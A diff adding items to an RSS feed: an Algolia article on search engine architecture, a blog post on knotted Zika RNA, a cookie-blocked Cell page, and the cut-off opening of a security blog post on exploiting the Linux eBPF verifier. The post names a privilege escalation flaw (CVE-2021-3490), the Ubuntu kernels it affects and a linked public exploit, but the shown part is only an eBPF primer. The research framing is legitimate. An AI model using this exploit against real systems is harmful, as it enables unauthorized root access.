@@ -24240,5 +24240,991 @@ date/time that you specify into the desired application.
       <pubDate>Sun, 08 Aug 2021 06:37:18 +0000</pubDate>
       <source>https://martinheinz.dev/blog/54</source>
     </item>
+    <item>
+      <title>Evolution of Search Engines Architecture – Algolia Search Architecture Part 1</title>
+      <link>http://highscalability.com/blog/2021/8/2/evolution-of-search-engines-architecture-algolia-new-search.html</link>
+      <description></description>
+      <content:encoded><![CDATA[<div id="readability-page-1" class="page"><div>
+  
+        
+        
+        
+          <p></p>
+
+<p><em>What would a totally new search engine architecture look like? Who better than <a href="https://twitter.com/jlemoine_algo?lang=en">Julien Lemoine</a>, Co-founder &amp; CTO of <a href="https://www.algolia.com/">Algolia</a>, to describe what the future of search will look like. This is the first article in a series.</em></p>
+
+<p dir="ltr"><span>Search engines, and more generally, information retrieval systems, play a central role in almost all of today’s technical stacks. Information retrieval started in the beginning of computer science. Research accelerated in the early 90s with the introduction of the Text REtrieval Conference (TREC). After more than 30 years of evolution since TREC, search engines continue to grow and evolve, leading to new challenges.</span></p>
+<p dir="ltr"><span>In this article, we look at some key milestones in the evolution of search engine architecture. We also describe the challenges those architectures face today. As you’ll see, we grouped the engines into four architecture categories. This is a simplification, as there are in reality a lot of different engines with various mix of architectures. We did this to focus our attention on the most important characteristics of those architectures.</span></p>
+<h2 dir="ltr"><span>1. The Inverted Index —  the early days of search</span></h2>
+<p dir="ltr"><span>In the early days of search engines, the first big revolution was the use of </span><span>inverted indexes</span><span>. The word “index” comes from the index that you find at the end of books, which associates a word with the different pages that contain information about the word. </span></p>
+<p dir="ltr"><span>Essentially, a search engine builds a dictionary of every word, where, for each word, it stores and sorts the list of documents that contain the word. Thus, when an end user performs a query with multiple words, the search engine can scan all the words, compute the </span><span>intersection</span><span> (documents that contain all the words), and rank them.</span></p>
+<p dir="ltr"><span>All search engines follow this general concept of indexing. Indexing opened a new area of research on how to represent inverted indexes (composed of several inverted lists) in an efficient way. This research led to multiple sets of compression algorithms to efficiently compress and scan those inverted lists containing more and more information.</span></p>
+<p dir="ltr"><span>If you’re interested in the way inverted lists are represented, and the different algorithms that can be used, I recommend reading the book </span><a href="https://nlp.stanford.edu/IR-book/information-retrieval-book.html"><span>Introduction to Information Retrieval</span></a><span> by Christopher D. Manning.</span></p>
+<p dir="ltr"><span>In terms of software architecture, search engines in the early days could be summarized as:</span></p>
+<ul>
+<li dir="ltr">
+<p dir="ltr"><span>One “indexing process” taking the list of records to compute and producing a binary file representing the inverted index</span></p>
+</li>
+<li dir="ltr">
+<p dir="ltr"><span>One “query processing” search process interpreting the binary file to compute the intersection of inverted lists for a particular query</span></p>
+</li>
+</ul>
+<p dir="ltr"><span><span></span></span></p>
+<p dir="ltr"><span>Schema 1: Simple representation of a search architecture (software in blue) </span></p>
+<p dir="ltr"><span>There was no concept of scaling at this stage. This architecture worked well for small amounts of data. The web expansion in the early 90s, where the volume of data increased rapidly, required a scaling of this architecture.</span></p>
+<h2 dir="ltr"><span>2. Introduction of sharding - parallelization</span></h2>
+<p dir="ltr"><span>In the early days of the internet, websites were listed manually in a directory. It became obvious after a few years that a manual list could not continue to deal with the increasing number of websites (according to </span><a href="https://www.internetlivestats.com/total-number-of-websites/"><span>internet live stats</span></a><span>, the number of websites evolved from 130 websites in 1993, to 23,500 in 1995). Thus began the most popular use case for search engines: web search engines. </span></p>
+<p dir="ltr"><span>In 1993, the first web search engines were introduced. They all had to handle a massive increase in the volume of data in the early 90s. In 1995, when Alta Vista was introduced by Digital Equipment Corporation (DEC), it was to illustrate the power of their multi-processor 64-bit Alpha servers. It was one of the first, if not the first, fully parallelized search engine able to index the 10M websites that were listed at the time.</span></p>
+<p dir="ltr"><span>Parallelization is fairly straightforward to apply to search engines : </span></p>
+<ul>
+<li dir="ltr">
+<p dir="ltr"><span>Instead of having one inverted index with all the documents, you can split the documents in N smaller sets of documents. Each set is called a </span><span>shard</span><span> and contains a subset of the initial document set.</span></p>
+</li>
+</ul>
+<ul>
+<li dir="ltr">
+<p dir="ltr"><span>Now you can run the </span><span>indexing</span><span> of all those shards in parallel, producing N smaller inverted indices instead of one big inverted index.</span></p>
+</li>
+<li dir="ltr">
+<p dir="ltr"><span>Finally, you can </span><span>search</span><span> in each shard in parallel, producing N queries and aggregating the results to produce the unified result set.</span></p>
+</li>
+</ul>
+<p dir="ltr"><span><span></span></span></p>
+<p dir="ltr"><span>Schema 2: Architecture of a sharded search engine</span></p>
+<p dir="ltr"><span>The introduction of sharding enabled search engines to treat large volumes of data. In the early days of sharding, the number of shards, and by extension the number of servers, were fixed in advance. Many implementations used a mathematical hashing function to allocate one document to one of the N shards. A document was always allocated to the same shard and therefore will never lead to a duplication of records between the shards.</span></p>
+<p dir="ltr"><span>This shard-based search engine architecture can be summarized as:</span></p>
+<ul>
+<li dir="ltr">
+<p dir="ltr"><span>A fixed number of shards distributed across different servers</span></p>
+</li>
+<li dir="ltr">
+<p dir="ltr"><span>A distributed computation of the inverted index (indexing, one thread per shard)</span></p>
+</li>
+<li dir="ltr">
+<p dir="ltr"><span>A distributed computation of the search results across the different shards (searching, one thread per shard), finalized by a fast merge of the N results</span></p>
+</li>
+</ul>
+<p dir="ltr"><span>Some additional comments:</span></p>
+<ul>
+<li dir="ltr">
+<p dir="ltr"><span>Indexing and searching need to be on the same machine for a given shard (inverted indexes are on local storage).</span></p>
+</li>
+<li dir="ltr">
+<p dir="ltr"><span>There are no mechanisms like a distributed commit allowing an indexing operation to be visible on all shards at the same time. For example, if you want to change the list of attributes that you index, or if you want to change your record structure, you will need to create another index, as you cannot do those operations atomically.</span></p>
+</li>
+<li dir="ltr">
+<p dir="ltr"><span>New types of problems crop up when the merge function has to deal with non-algebraic aggregation. An example is collapsing results based on field values (for example, a job board where you want to collapse jobs per company name, and then display the top 10 jobs for each category).</span></p>
+</li>
+</ul>
+<p dir="ltr"><span>This type of architecture was used during the 90s and even early 2000s. Of course, a lot of refinements and improvements were applied to those architectures to make sure they were able to support the load. For example, batch indexing was quickly replaced by incremental builds of data structures to avoid rebuilding the whole inverted list at each pass (similar to databases). Sharding is a key component of search engines to make them scale. Today, it’s part of all search engine architectures in addition to other principles to reach </span><span>high availability</span><span>, which we describe in the next section.</span></p>
+<h2 dir="ltr"><span>3. High Availability and scaling of search - the age of maturity</span></h2>
+<p dir="ltr"><span>Search engines need to scale, to manage large volumes of data and numbers of queries. According to </span><a href="https://www.internetworldstats.com/emarketing.htm"><span>Internet World Stats</span></a><span>, there were only 16M internet users in 1995, but it grew quickly to reach more than 5B in 2020. </span></p>
+<p dir="ltr"><span>The previous section discussed how to manage large volumes of data with sharding. The next problem is how to manage the large volume of </span><span>queries,</span><span> and the associated high-availability of search (that is, supporting hardware failures).</span></p>
+<p dir="ltr"><span>Solving this problem requires introducing replicas of the inverted shards to be able to answer a query from multiple sets of machines. The general principle is straightforward: we use the same architecture as before, but we have N groups of machines able to answer any query instead of having only one group of machines. Each group of machines contains all the shards to answer any query and the number of replicas can grow or shrink depending on the volume of queries.</span></p>
+<p dir="ltr"><span>The complexity of such architecture is mainly in the replication logic and has the same properties and drawbacks as the previous architecture. The complexity of the replication of inverted indices depends on the format of the data structure on disk. Generational data structures are often optimized to minimize the amount of data transferred. If you’re interested in learning more about the different types of data structure on disk, I recommend reading </span><a href="https://blog.senx.io/demystifying-leveldb/"><span>the description of the LevelDB key value store internals</span></a><span>; the same concept is often applied to search engines.</span></p>
+<p dir="ltr"><span>When the architecture is hosted in a public cloud environment, the different groups of machines must be hosted on different availability zones to target a better service level objective (SLO). A load balancer component is required to distribute the queries to the different sets of machines, and to retry on error.</span></p>
+<p dir="ltr"><span>This replica-based search engine architecture has exactly the same characteristics as the previous one, with the addition of:</span></p>
+<ul>
+<li dir="ltr">
+<p dir="ltr"><span>Capacity to handle an infinite amount of queries via replications of the data (increasing capacity takes time, usually hours as it requires copying the inverted indices from the existing machines. This is a good solution only when the increase of traffic can be anticipated.).</span></p>
+</li>
+<li dir="ltr">
+<p dir="ltr"><span>In a multi-provider deployment, the copy of the on-disk data-structure is often replaced by a primary/replicas setup where the indexing operations are transfered. The primary shard receives indexing operations, stores them in a LOG. The LOG is consumed locally by the indexing process and the LOG is replicated to one or several locations. The reason for this setup is that it’s usually faster to replicate the indexing operations instead of the binary files, as the inter-provider bandwidth can be the bottleneck when transferring large binary files.</span></p>
+</li>
+</ul>
+<h2 dir="ltr"><span>4. High Availability of indexing and elasticity - the business critical area</span></h2>
+<p dir="ltr"><span>Given the importance of high-availability of search for all online businesses, it’s crucial to tolerate hardware failure without any business impact. Architectures must manage hardware failure so that it remains transparent to the end user.</span></p>
+<p dir="ltr"><span>The previously discussed architecture introduced the possibility to accept hardware failure without impacting the ability to search. New use cases like Snapshat make indexing a critical piece of the system: Snapshot’s information is ephemeral and needs to be searchable quickly, so the indexing also requires high availability. High availability of indexing was introduced to search engines via different architectures that all have in common that at least two machines can build one shard. The most famous architecture is Elasticsearch, introduced in 2010 with high availability of search and indexing. The most significant innovation Elasticsearch introduced was not the high availability of indexing; it was the elasticity. Elasticity is the ability to add machines to an existing instance and move shards between machines. It was a significant evolution of search engine architectures!</span></p>
+<p dir="ltr"><span>The introduction of high availability of indexing is an evolution of the primary/replicas architecture described in the previous section. Each shard has one primary, thus ensuring a unique ordering of indexing jobs and N replicas. It’s important to ensure that each replica will process the jobs in the same order to converge on the exact same state.</span></p>
+<p dir="ltr"><span>Suppose the machine hosting the primary shard is down. In that case, one replica is elected as the new primary via a </span><span>leader election algorithm</span><span> to ensure a globally consistent state.</span></p>
+<p dir="ltr"><span>To illustrate this, let&#39;s take the following example: </span></p>
+<ul>
+<li dir="ltr">
+<p dir="ltr"><span>One index containing four shards.</span></p>
+</li>
+<li dir="ltr">
+<p dir="ltr"><span>Factor-three replication (three copies of each shard: one primary shard and two replica shards). </span></p>
+</li>
+<li dir="ltr">
+<p dir="ltr"><span>Distributed over four machines. Each machine contains one primary shard and two replicas.</span></p>
+</li>
+</ul>
+<p dir="ltr"><span>When an indexing operation comes to the system, a routing phase routes the operation to the correct primary shard. This routing process can be performed by any one of the three machines (so you can target any machine to perform the indexing operation). The indexing process of the primary shard will then replicate the indexing operation on every shard, resulting in the application of the indexing operation on three machines in parallel (schema 3)</span></p>
+<p dir="ltr"><span><span></span></span></p>
+<p dir="ltr"><span>Schema 3: Example of an indexing operation for the shard 1 in the case of one index with four shards, a replication factor of three.</span></p>
+<p dir="ltr"><span>A load balancer selects one of the three copies of each shard to perform the query. The three copies allow three times more queries per second than with a single copy of the shard. In this setup, the machines are spread over two availability zones (AZ). Each AZ runs on as many different physical infrastructures as possible inside a cloud-provider region. The three copies are stored in a way where the first copy is 100% hosted on the first AZ, the second copy is 100% hosted on the second AZ, and the third copy is split between the two AZ. Schema 4 illustrates one query sent to the copy that is 100% hosted on the first AZ.</span></p>
+
+<p dir="ltr"><span><span></span></span></p>
+<p dir="ltr"><span>Schema 4: Example of a query processed by the replica, hosted fully on the first AZ</span></p>
+<p dir="ltr"><span>On each machine, the indexing and the search processes can access all the shards stored locally. The elasticity comes from adding and removing machines to an existing setup. For example, it’s possible to add a new machine to the previous example. The shards would then automatically be moved to the new machine to ensure you have an even-loaded spread on each machine. Depending on the allocation algorithm of your search engine, you can end up with a result similar to schema 5.</span></p>
+<p dir="ltr"><span>The number of shards is static in this architecture. Defining the number of shards is a critical element of your configuration, as it defines the ability to scale and your underlying performance. In this example, the number of shards is not big enough to use all the CPU resources on all machines. Still, you can increase the number of replicas to support more queries per second and use all resources, which is the standard way to scale.</span></p>
+<p dir="ltr"><span>It’s also important not to have too many shards. The goal is to process all of them in parallel. If you do not have enough CPU threads for all shards at the same time, it will negatively impact your response time.</span></p>
+<p dir="ltr"><span><span></span></span></p>
+<p dir="ltr"><span>Schema 5: Example after the addition of a new machine in the second availability zone</span></p>
+<p dir="ltr"><span>There are two types of failures that this architecture can support while keeping all shards available:</span></p>
+<ol>
+<li dir="ltr">
+<p dir="ltr"><span>One machine is down. This would have no impact on the ability to index and search. There are enough replicas to ensure we can still perform a search query. The leader election will elect one of the two replicas as master. The only impact would be to reduce the search capacity because fewer CPU threads are available for search.</span></p>
+</li>
+<li dir="ltr">
+<p dir="ltr"><span>One AZ is down. In this case, the search would still be available with less capacity to scale. Indexing would be unavailable for two shards as only one of the three copies remains, which prevents a leader election.</span></p>
+</li>
+</ol>
+<p dir="ltr"><span>This type of architecture is today’s state of the art in search architecture, with the following characteristics:</span></p>
+<ul>
+<li dir="ltr">
+<p dir="ltr"><span>Ability to scale in terms of data depending on the number of shards you configured</span></p>
+</li>
+<li dir="ltr">
+<p dir="ltr"><span>Ability to scale in terms of volume of queries by adding new replicas</span></p>
+</li>
+<li dir="ltr">
+<p dir="ltr"><span>Ability to tolerate hardware failure and availability zone (AZ) failure to some extent</span></p>
+</li>
+</ul>
+<h2 dir="ltr"><span>5. Next steps — the current challenges of search engines</span></h2>
+<p dir="ltr"><span>The latest generation of architecture is now more than ten years old! Since then, fast-growing marketplaces and SaaS applications have put many constraints on those architectures. It’s now time to design the next generation of architecture for the next ten years, solving the following challenges:</span></p>
+<ul>
+<li dir="ltr">
+<p dir="ltr"><span>Sub-minute addition/removal of machines</span><span>. We already know how to </span><span>add/remove machines from an existing instance. However, we need to go one step further to support dynamic scalability: the ability to add or remove machines in under a minute and the ability to temporarily handle the increased traffic before the new machine is available! Search engines today are more than ever required to anticipate growth, and scale their infrastructure for spikes of traffic. Total dynamic scalability will allow everyone to be more cost efficient while unlocking new creative usage of search engines. For example, one big marketplace presented the idea of a flash sale on their store leveraging the search engine: customers have to find a cheap product hidden in their large catalogue. You can imagine the flood of queries their search engine received just after they sent an email to millions of users, their last event generated 160 times more traffic than their average daily traffic. But the same happens every time some search event goes viral, which is usually impossible to plan for in advance.</span></p>
+</li>
+<li dir="ltr">
+<p dir="ltr"><span>A dynamic number of shards</span><span>. The number of shards is a critical factor of performance and ability to scale. To be optimum, this number would need to change often. The next generation of search engine architectures will allow you to change this number dynamically. It will also need to go further, where the engine tunes this number automatically to ensure you always have the optimum performance and ability to scale.</span></p>
+</li>
+<li dir="ltr">
+<p dir="ltr"><span>Separation of search and indexing</span><span>. Scaling both in terms of volume of queries and volume of data is the most demanding situation for a search engine. It’s a problem for many use cases like marketplaces. In such a situation, the cost of infrastructure can quickly become prohibitive if you perform the indexing for each replica. Increasing the search or indexing capacity impacts the resource consumption of the existing machines. For example, when the system is already loaded, scaling one of the subsystems can make the whole system collapse. The next generation will have high availability of search and indexing while doing only a one-time indexing job for each shard. It will scale indexing and search separately, avoiding any negative impact of indexing on search.</span></p>
+</li>
+<li dir="ltr">
+<p dir="ltr"><span>Leveraging the evolution of network bandwidth</span><span>. Having a 1Gbps link between machines was the norm ten years ago. Today, you have access to up to 100 Gbps network links in a public cloud provider, and it will become more and more the norm. The CPU and storage improvements were much more limited in the same period than the 100X factor on the bandwidth! Leveraging such network architecture requires a very different data transfer usage with more parallelization. It’s an essential factor that needs to be the core of the search engine architecture to scale efficiently.</span></p>
+</li>
+<li dir="ltr">
+<p dir="ltr"><span>Native multi-tenant optimization</span><span>. It’s widespread for SaaS applications to host multiple users inside a single index. It would be way too expensive to have a dedicated index for each customer. While this is a great strategy, it’s today pretty much impossible to deliver guaranteed performance for the biggest users. The new search architecture needs to evolve to make sure it can still </span><span>appear to be</span><span> one index from a logical perspective. Still, the most significant customers have dedicated shards and resources to ensure guaranteed performance and avoid any impacts from other customers.</span></p>
+</li>
+</ul>
+<p dir="ltr"><span>We identified those five unique challenges in 2019 when we started the work on our next-generation architecture. We&#39;ve developed a unique architecture aimed at solving those five challenges, and we have our first customers testing it. The following articles will give more details about how this architecture works and how we solve those five unique challenges of search.</span></p>
+
+
+        
+  
+          
+  
+         
+  
+      </div></div>]]></content:encoded>
+      <pubDate>Sun, 08 Aug 2021 12:36:42 +0000</pubDate>
+      <source>http://highscalability.com/blog/2021/8/2/evolution-of-search-engines-architecture-algolia-new-search.html</source>
+    </item>
+    <item>
+      <title>Viral Knots</title>
+      <link>https://blogs.sciencemag.org/pipeline/archives/2021/08/06/viral-knots</link>
+      <description></description>
+      <content:encoded><![CDATA[<div id="readability-page-1" class="page"><div>
+
+  
+  <p>The current pandemic has made everyone think a lot more about viruses than they ever had any desire to, but they’re a constant background to our lives – and to the lives of pretty much every living creature. Humans have their viruses, other mammals have theirs (with occasional catastrophic overlaps), and birds, reptiles, and fish all have their own as well. Worms, ocean sponges, mollusks, insects – they all have their suite of viruses that infect them, all the way down to the phages that attack bacteria. Plants of all kinds have their own viral load as well. This is what things look like after a couple of billion years of evolutionary competition; viruses are too successful at what they do to not be everywhere.</p>
+<p>We’ve also all had to learn a lot more than we ever wanted to about our defense mechanisms against these things, and I wanted to highlight an odd feature of one of those today, as seen in <a href="https://www.nature.com/articles/s41589-021-00829-z">this paper</a>. When you’re infected with an RNA virus, one of the common counterattacks is through RNAse enzymes, which attempt to break down the foreign sequences. They break down a lot of our own RNA molecules as well, of course – many types of RNA have a rather short half-life in the cell, and if you need them to last longer, you have to work in some special features.</p>
+<p>Viruses have long since stumbled onto those sorts of trick as well, of course: an RNA virus whose genetic material isn’t degraded so quickly by host defenses has an obvious advantage. One of the things that dodges RNAse activity is for the RNA molecule itself to be oddly shaped and knotted. These sequences (exoribonuclease-resistant RNAs, or xrRNAs) have been elaborated over the years to the point that some viruses use them both as protection and as a means to have host RNAse enzymes directed to places where the RNA needs to be cut anyway! Viruses travel light. Any work that can be offloaded onto the host cell generally is.</p>
+<p>The flaviviruses were the first family seen to be taking advantage of these effects (although they’ve since been noticed in other types of viruses as well). That one’s pretty high-profile, though: yellow fever, Zika, chikungunya and dengue are all caused by pathogens in this group. Zika, for example, has an interesting knotted structure in one region of its RNA that causes a whole range of incompletely broken-down RNA species to form when the host cell RNAses try to digest it. These things pile up inside the cell and start disrupting all sorts of other cellular processes in turn (such as the ones that respond to viral attack!) making for a more successful infection.</p>
+<p>You always have to guard your thinking about these things, of course. Our brains have a bias towards imputing agency to things – it’s how we model behavior of threats like animals (including other humans), and it’s a valuable heuristic indeed. But it also makes us think that Zeus or whoever is trying to zap us with lightning bolts, that hurricanes steer into godless dens of sinners that deserved it anyway, and that the reason the NMR sample changer dropped three hours worth of tubes onto the floor last night is because the robot hates you and wants your experiments to fail. Viruses are not planning out their strategies. They mutate and wander and stumble and putz around randomly until something works a bit better to make Moar Virus, and then that Moar Virus change, whatever the hell it was, gradually becomes more common in the population. We’re seeing the end result of who knows how many epochs of such mutations, all done under the pressure of host organism counterattacks, so it looks pretty impressive by now. The fact that we don’t see the untold, unknowable number of misfires also helps. It’s the same strategy that astrologers and fortunetellers use on purpose: make the most out of your successes and sweep all the failures out of sight. If at first you don’t succeed, destroy all evidence that you even tried. Virus success is obvious and rises quickly to the top; virus failures vanish.</p>
+<p>The paper linked above looks at one of the knots in Zika viruses, by the high-tech means of attaching chemical handles to each end of the knot and capturing those in optical traps. This allows you to pull on the ends in a very controlled fashion and to get a profile of the unraveling as it takes place on a single RNA molecule. Here’s what they find:</p>
+<div class="page" title="Page 1">
+<div>
+<div>
+<blockquote><p><em>By measuring the extension of the xrRNA as its structure changed, we identified intermediates in the folding and deduced their structures. We found that the core of the native fold was very resistant to mechanical unfolding, but achieving this extreme resistance required a specific sequence of steps in the folding: formation first of a three-helix junction, then threading of the 5′ end into a cleft in this junction and stabilization by tertiary contacts, before closure of the ring around the threaded 5′ end by a PK.</em></p></blockquote>
+<p></p>
+<p>So when we say that there’s a knot in the RNA, that is exactly what’s going on, and these knots – like the ones you’d tie with rope – have a particular topology and a particular series of steps to get them tied correctly. The structure of this one is shown in schematic at right, and you can see that 5′ end stuck back in through that cleft. The RNAse enzymes obviously don’t quite know what to make of this, since many of them start digesting from the 5′ end and run smack into the knot. What this paper found, though, is that all knots are not created equal. It appears that just forming any old knot is insufficient by itself to fight off the RNAses, but this Zika one has much high mechanical resistance to being pulled apart than usual, and that’s the key feature. The authors are planning to test this idea with RNA knots from other viruses. Perhaps in another few million years an RNAse will show up that will be able to deal with these things, and things will move on.</p>
+<p>If I had to pick one thing about cell biology from my undergraduate education – heck, my graduate education – that has utterly changed over the years, it would be the wild functional and structural variety of RNA molecules that have been uncovered. RNAs in general can form a bewildering number of structures, and only a fool would think that we’ve come to the end of them. And there are surely useful things that we could make that nature has never quite gotten around to finding a use for, either!</p>
+</div>
+</div>
+
+</div>
+
+  
+
+
+
+          </div></div>]]></content:encoded>
+      <pubDate>Sun, 08 Aug 2021 14:38:31 +0000</pubDate>
+      <source>https://blogs.sciencemag.org/pipeline/archives/2021/08/06/viral-knots</source>
+    </item>
+    <item>
+      <title>Natural immunity to Covid-19 is durable and persistent</title>
+      <link>https://www.cell.com/cell-reports-medicine/fulltext/S2666-3791(21)00203-2</link>
+      <description></description>
+      <content:encoded><![CDATA[<div id="readability-page-1" class="page"><div id="pb-page-content" data-ng-non-bindable="">
+        <div data-pb-dropzone="main" data-pb-dropzone-name="Main">
+
+    
+
+        
+
+
+    
+
+                
+                
+                
+                
+                
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                        
+                        
+                        
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                
+                
+                <div id="aa0d7f05-180d-4231-8c31-adaf1c8c8b9e">
+                
+                
+
+                <div>
+                    
+                    <div><p>This site requires Cookies to be enabled to function. Please ensure Cookies are <strong>turned on</strong> and then re-visit the desired page.</p></div>
+                </div>
+                </div>
+
+        
+        </div>
+    </div></div>]]></content:encoded>
+      <pubDate>Sun, 08 Aug 2021 15:07:15 +0000</pubDate>
+      <source>https://www.cell.com/cell-reports-medicine/fulltext/S2666-3791(21)00203-2</source>
+    </item>
+    <item>
+      <title>Kernel Pwning with eBPF: A Love Story</title>
+      <link>https://www.graplsecurity.com/post/kernel-pwning-with-ebpf-a-love-story</link>
+      <description></description>
+      <content:encoded><![CDATA[<img src="https://rss.markdessain.com/feeds/hackernews/https___www_graplsecurity_com_post_kernel-pwning-with-ebpf-a-love-story/image.jpg" /> 
+<div id="readability-page-1" class="page"><div data-hook="post-description"><article><div><div><div><div data-rce-version="8.46.0"><div dir="ltr" data-id="rich-content-viewer"><div><p id="viewer-foo"><span>By: Valentina Palmiotti, <a href="https://twitter.com/chompie1337" target="_blank" rel="noopener noreferrer">@chompie1337</a> </span></p><p id="viewer-btbes"><span>At <a href="https://www.graplsecurity.com/" target="_blank" rel="noopener noreferrer">Grapl</a> we believe that in order to build the best defensive system we need to deeply understand attacker behaviors. As part of that goal we&#39;re investing in offensive security research. <a href="https://www.graplsecurity.com/subscribe" target="_blank" rel="noopener noreferrer">Keep up with our blog</a> for new research on high risk vulnerabilities, exploitation, and advanced threat tactics. </span></p><p id="viewer-dv2a0"><span>Find the released local privilege escalation (LPE) Proof-of-Concept for <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-3490" target="_blank" rel="noopener noreferrer">CVE-2021-3490</a> here: <a href="https://github.com/chompie1337/Linux_LPE_eBPF_CVE-2021-3490" target="_blank" rel="noopener noreferrer">https://github.com/chompie1337/Linux_LPE_eBPF_CVE-2021-3490</a>. It targets Ubuntu 20.10 (Groovy Gorilla) kernels 5.8.0-25.26 through 5.8.0-52.58. and Ubuntu 21.04 (Hirsute Hippo) 5.11.0-16.17.</span></p><p id="viewer-ecic0"><span>This blog post is intended to give a detailed overview of eBPF from the perspective of an exploit developer. In this post, I cover:</span></p><ul><li id="viewer-27p3l"><p>The basics of how eBPF works</p></li><li id="viewer-4913p"><p>The internals of the eBPF verifier</p></li><li id="viewer-eiiaj"><p>A vulnerability (<a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-3490" target="_blank" rel="noopener noreferrer">CVE-2021-3490</a>) I exploit for local privilege escalation <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-3490" target="_blank" rel="noopener noreferrer">[13]</a>. </p></li><li id="viewer-c9rh4"><p>Debugging eBPF bytecode</p></li><li id="viewer-1m76q"><p>Exploitation techniques for DoS, information leak, and LPE</p></li><li id="viewer-6c49p"><p>Some interesting observations and other bugs I discovered</p></li><li id="viewer-ahga9"><p>New mitigations that make the bug class more difficult to exploit</p></li><li id="viewer-diun4"><p>Weaknesses that are still present in eBPF today</p></li></ul><p id="viewer-vduu"><span>I had no knowledge of eBPF going into this.  My hope is that by sharing a PoC as well as my experience developing it, it can help others get started with eBPF exploitation.</span></p><h2 id="viewer-fi1dp"><span>eBPF: a Primer</span></h2><div id="viewer-cdi2g"><div><div data-hook="imageViewer" role="button" tabindex="0"><div><p></p></div></div></div></div><h3 id="viewer-32lct"><span>Extended Berkeley Packet Filter: What is it?</span></h3><p id="viewer-fbffg"><span>Berkeley Packet Filter (BPF) was initially created as a way to perform packet filtering in the kernel. Its capabilities were later redesigned and extended to create extended Berkeley Packet Filter (eBPF) <a href="https://qmonnet.github.io/whirl-offload/2016/09/01/dive-into-bpf/" target="_blank" rel="noopener noreferrer">[1]</a>.</span></p><p id="viewer-16c14"><span><span>Put simply, eBPF provides a way for a user mode application to run code in the kernel without needing to write a kernel module.</span>The purported benefits of using eBPF versus a kernel module are ease of use, stability, and security. There are also performance improvements gained by doing certain tasks directly in the kernel compared to a pure user mode program.  eBPF programs are used to do a myriad of things such as: tracing, instrumentation, hooking system calls, debugging, and of course, packet capturing/filtering. </span></p><p id="viewer-au10u"><span>eBPF programs are written in a high level language and compiled into eBPF bytecode using a toolchain (such as <a href="https://github.com/iovisor/bcc" target="_blank" rel="noopener noreferrer">BCC</a><a href="https://github.com/iovisor/bcc" target="_blank" rel="noopener noreferrer"> </a><a href="https://github.com/iovisor/bcc" target="_blank" rel="noopener noreferrer">[18]</a>). The eBPF VM uses a simple instruction set that uses eleven* 64-bit registers, a program counter, and a 512 byte fixed-size stack. Nine registers are general purpose read-write, one is a read-only stack pointer and the program counter is implicit <a href="https://www.collabora.com/news-and-blog/blog/2019/04/15/an-ebpf-overview-part-2-machine-and-bytecode/" target="_blank" rel="noopener noreferrer">[2]</a><em>.</em> The instruction set is similar to x86, and operates on both 64 and 32 bit values.</span></p><pre id="viewer-2rd7i"><span><span>BPF_MOV64_IMM</span><span>(</span><span>BPF_REG_0</span><span>,</span> <span>0</span><span>)</span>
+<span>BPF_STX_MEM</span><span>(</span><span>BPF_W</span><span>,</span> <span>BPF_REG_10</span><span>,</span> <span>BPF_REG_0</span><span>,</span> <span>-</span><span>4</span><span>)</span>
+<span>BPF_MOV64_REG</span><span>(</span><span>BPF_REG_2</span><span>,</span> <span>BPF_REG_10</span><span>)</span>
+<span>BPF_ALU64_IMM</span><span>(</span><span>BPF_ADD</span><span>,</span> <span>BPF_REG_2</span><span>,</span> <span>-</span><span>4</span><span>)</span>
+<span>BPF_JMP_IMM</span><span>(</span><span>BPF_JNE</span><span>,</span> <span>BPF_REG_0</span><span>,</span> <span>0</span><span>,</span> <span>1</span><span>)</span>
+<span>BPF_MOV32_IMM</span><span>(</span><span>BPF_REG_3</span><span>,</span> <span>0xFFFFFFFF</span><span>)</span></span></pre><p id="viewer-el5pj"><span><em>Example of eBPF bytecode instructions</em></span></p><p id="viewer-8qm90"><span><em>*Technically, it uses </em><a href="https://elixir.bootlin.com/linux/latest/source/include/uapi/linux/bpf.h#L65" target="_blank" rel="noopener noreferrer"><em>12 registers,</em></a><em> but the 12th register is an auxiliary register only used to perform ALU sanitation operations</em> <a href="https://elixir.bootlin.com/linux/latest/source/include/uapi/linux/bpf.h#L65" target="_blank" rel="noopener noreferrer"><em>[12].</em></a>
+
+</span></p><p id="viewer-1pni9"><span>A user mode application loads the bytecode into the kernel using the <a href="https://man7.org/linux/man-pages/man2/bpf.2.html" target="_blank" rel="noopener noreferrer"><span>bpf()</span></a><span> </span><a href="https://man7.org/linux/man-pages/man2/bpf.2.html" target="_blank" rel="noopener noreferrer"><u>[14]</u></a> syscall, where the eBPF verifier will perform a number of checks to ensure the program is “safe” to run in the kernel. This verification step is critical - eBPF exposes a path for unprivileged users to execute in ring0. </span></p><p id="viewer-3og58"><span>After the program is loaded, the user mode application attaches the program to a “hook point”. A hook point is a place in the kernel where eBPF programs can be attached <a href="https://blog.stackpath.com/bpf-hook-points-part-1/" target="_blank" rel="noopener noreferrer">[5]</a>. eBPF programs are event driven, meaning the program will execute when certain events occur at the hook point. The classic use case is attaching an eBPF program to a socket, where the program will execute when data is written to it. </span></p><p id="viewer-ck6k4"><span>If the <span><span>kconfig</span></span>  knob <span><span>CONFIG_BPF_JIT</span></span>  is set, the eBPF program is JIT compiled into native assembly instructions after it is verified and loaded. Otherwise, when the program is executed it is run in the eBPF interpreter which decodes and executes the eBPF bytecode instructions. 
+
+</span></p><p id="viewer-5smvr"><span>User mode applications can interact with and get data from the eBPF program running in the kernel using eBPF maps and eBPF helper functions, which are accessed via the  <span> <span>bpf()</span> </span> syscall.</span></p><div id="viewer-b68"><div><div data-hook="imageViewer" role="button" tabindex="0"><div><p></p></div></div></div></div><p id="viewer-c99tc"><span>The <span><span> </span><span>sysctl</span><span> </span></span> knob <span><span> kernel.unprivileged_bpf_disabled </span></span> determines whether unprivileged users are allowed to run eBPF programs. If it is not set, unprivileged users are allowed to attach an eBPF program to a socket that the user owns. In many Linux distributions, such as Ubuntu, 
+<span><span> unprivileged_bpf_disabled </span></span> is not enabled by default. Because of this, I decided to look into eBPF more closely, as allowing unprivileged users to run code in the kernel is a ripe attack surface. 
+
